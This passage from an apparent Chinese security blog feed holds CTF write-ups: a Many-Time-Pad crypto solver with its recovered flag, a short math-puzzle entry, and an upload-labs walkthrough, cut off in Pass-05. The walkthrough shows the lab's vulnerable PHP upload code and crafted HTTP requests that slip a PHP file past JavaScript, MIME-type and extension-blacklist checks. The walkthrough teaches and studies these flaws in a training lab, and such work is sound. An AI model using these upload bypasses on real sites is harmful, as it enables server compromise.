[f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line">know(<span class="number">10</span>, <span class="number">21</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">know(<span class="number">8</span>, <span class="number">14</span>, <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"></span><br><span class="line">key = xo.strxor(c[<span class="number">0</span>], <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> msg[<span class="number">0</span>]]).encode())</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Dear Friend, This <span class="built_in">time</span> I u</span><br><span class="line">nderstood <span class="keyword">my</span> mistake <span class="keyword">and</span> u</span><br><span class="line">sed One <span class="built_in">time</span> pad encryptio</span><br><span class="line">n scheme, I heard <span class="keyword">that</span> <span class="keyword">it</span> </span><br><span class="line"><span class="keyword">is</span> <span class="keyword">the</span> only encryption met</span><br><span class="line">hod <span class="keyword">that</span> <span class="keyword">is</span> mathematically</span><br><span class="line"> proven <span class="keyword">to</span> be <span class="keyword">not</span> cracked </span><br><span class="line">ever <span class="keyword">if</span> <span class="keyword">the</span> key <span class="keyword">is</span> kept se</span><br><span class="line">cure, Let Me know <span class="keyword">if</span> you a</span><br><span class="line">gree <span class="keyword">with</span> <span class="keyword">me</span> <span class="keyword">to</span> use this e</span><br><span class="line">ncryption scheme always...</span><br><span class="line">b&#x27;afctf&#123;OPT_1s_Int3rest1ng&#125;!&#x27;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Many-Time-Pad攻击利用了密钥重用导致明文信息线性泄漏的特性，结合自然语言的冗余性，通过统计分析恢复明文。这再次验证了OTP的核心安全准则：密钥绝对不可重用。<br>Many-Time-Pad 是不安全的。我们这一次的攻击，条件稍微有点苛刻：明文必须是英文句子、截获到的密文必须足够多。但是只要攻击者有足够的耐心进行词频分析、监听大量密文，还是能够发起极具威胁性的攻击。如果铁了心要用直接xor来加密信息，应当采用一次一密(One-Time-Pad)</p><p>参考：</p><ol><li><a href="https://www.ruanx.net/many-time-pad/">Pion1eer - Many-Time-Pad 攻击</a></li><li><a href="https://blog.csdn.net/m0_63303407/article/details/127193042">异或 MTP 攻击 - CSDN</a></li><li><a href="https://www.zhihu.com/question/26576521">多次使用“一次性密钥”(one-time pad)为什么不安全？- 知乎</a></li><li><a href="https://secinject.wordpress.com/2015/08/12/many-time-pad-attack/">SecInject - Many time pad attack</a></li><li><a href="https://dl.acm.org/doi/10.5555/829513.830504">ACM Digital Library</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Crypto-cat&#39;s gift</title>
      <link href="/2025/06/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-cat&#39;s%20gift/"/>
      <url>/2025/06/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-cat&#39;s%20gift/</url>
      
        <content type="html"><![CDATA[<h3 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h3><p>如图所示，下面这只好心的猫猫给你送来了跨年礼物。由于礼物不好拿，所以<strong>猫猫把礼物平均分成了四份，但是其中一份不小心掉在地上散落成了无数片，变成了 1 - 1&#x2F;3 + 1&#x2F;5 - 1&#x2F;7 + …</strong></p><p>聪明的你能算出或猜出猫猫的礼物是什么吗？  </p><p><strong>flag示例:</strong> <code>CatCTF&#123;apple&#125;</code> <code>CatCTF&#123;banana&#125;</code></p><p>关键：<strong>Gregory-Leibniz 公式</strong><br>德国数学家莱布尼茨（Leibniz）于 1674 年曾提出 Gregory-Leibniz 公式来计算π：<br>$π &#x2F; 4 &#x3D; 1 − 1 &#x2F; 3 + 1 &#x2F; 5 − 1 &#x2F; 7 + 1 &#x2F; 9 + . . . π&#x2F;4 &#x3D; 1 - 1&#x2F;3 +1&#x2F;5 - 1&#x2F;7 + 1&#x2F;9+ …π&#x2F;4&#x3D;1−1&#x2F;3+1&#x2F;5−1&#x2F;7+1&#x2F;9+…$<br>得到flag：<code>CatCTF&#123;pie</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs靶场小计</title>
      <link href="/2025/06/17/upload-labs%E9%9D%B6%E5%9C%BA%E5%B0%8F%E8%AE%A1/"/>
      <url>/2025/06/17/upload-labs%E9%9D%B6%E5%9C%BA%E5%B0%8F%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="Introduction："><a href="#Introduction：" class="headerlink" title="Introduction："></a>Introduction：</h1><ul><li><strong>Repo Address</strong>: <a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></li><li><strong>Description</strong>：upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</li></ul><h1 id="正文开始"><a href="#正文开始" class="headerlink" title="正文开始"></a>正文开始</h1><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p><strong>源码分析</strong>:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在源码中我们可以看到其在客户端使用了js对不合法图片进行了检查，因此只需要在Firefox浏览器中禁用js即可绕过</p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p><strong>源码分析</strong>:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在源码的<code>type</code>一处我们得知其对文件的类型做了限制，我们可以用BurpSuite或Yakit把数据包拉下来，然后将文件类型修改为对应的类型即可绕过</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST /upload-labs/Pass-02/index.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Accept-Encoding: gzip, deflate, br, zstd</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span><br><span class="line">Referer: http://127.0.0.1/upload-labs/Pass-02/index.php</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9OENpdlcocFeQ6oY</span><br><span class="line">sec-ch-ua: <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;137&quot;</span>, <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;137&quot;</span>, <span class="string">&quot;Not/A)Brand&quot;</span>;v=<span class="string">&quot;24&quot;</span></span><br><span class="line">sec-ch-ua-platform: <span class="string">&quot;Windows&quot;</span></span><br><span class="line">Content-Length: 325</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9OENpdlcocFeQ6oY</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;phpinfo.php&quot;</span></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt; </span><br><span class="line">------WebKitFormBoundary9OENpdlcocFeQ6oY</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9OENpdlcocFeQ6oY--</span><br></pre></td></tr></table></figure><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p><strong>源码分析：</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察后发现其仅过滤了<code>asp</code>,<code>aspx</code>,<code>php</code>和<code>jsp</code>这四种后缀名，这里举一个例子<code>php</code>-&gt;<code>phtml</code>以混淆视听</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST /upload-labs/Pass-03/index.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Referer: http://127.0.0.1/upload-labs/Pass-03/index.php</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAl4mS15DQA2JvZiO</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate, br, zstd</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">sec-ch-ua: <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;137&quot;</span>, <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;137&quot;</span>, <span class="string">&quot;Not/A)Brand&quot;</span>;v=<span class="string">&quot;24&quot;</span></span><br><span class="line">sec-ch-ua-platform: <span class="string">&quot;Windows&quot;</span></span><br><span class="line">Content-Length: 325</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAl4mS15DQA2JvZiO</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;phpinfo.Phtml&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt; </span><br><span class="line">------WebKitFormBoundaryAl4mS15DQA2JvZiO</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAl4mS15DQA2JvZiO--</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p><strong>源码分析：</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里我们可以观察出其过滤了很多后缀名，其次<code>转换大小写</code>使得我们无法通过混淆大小写以绕过，但是其中的<code>去除字符串::$DATA</code>和<code>收尾去空</code>使得我们可以用类似于双后缀的方法绕过，这样它会把后面那个后缀吃掉而只保留前面的后缀，且只验证被吃掉的那个后缀，最终成功解析</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload-labs/Pass-04/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryVUBAzK6LwIFArjzI</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/upload-labs/Pass-04/index.php</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;137&quot;, &quot;Chromium&quot;;v=&quot;137&quot;, &quot;Not/A)Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>325</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryVUBAzK6LwIFArjzI</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;phpinfo.php.jpg&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span> </span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryVUBAzK6LwIFArjzI</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryVUBAzK6LwIFArjzI--</span></span><br></pre></td></tr></table></figure><p><strong>在此我们认识到了一个更加有效的对抗文件上传漏洞的方案——以白名单代替黑名单</strong></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p><strong>源码分析：</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span 